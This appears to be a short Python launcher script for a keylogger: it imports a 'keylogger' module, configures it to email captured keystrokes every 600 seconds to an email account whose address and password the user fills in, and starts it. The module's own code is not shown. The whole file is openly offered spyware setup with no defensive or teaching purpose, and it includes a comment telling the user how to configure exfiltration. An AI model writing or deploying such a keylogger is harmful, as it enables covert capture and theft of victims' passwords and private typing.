#!usr/bin/env python

import keylogger

my_keylogger = keylogger.Keylogger(600, "email_address", "password")    #Enter the duration to send an email ( in sec ), email address and password of your email_account 
my_keylogger.start()
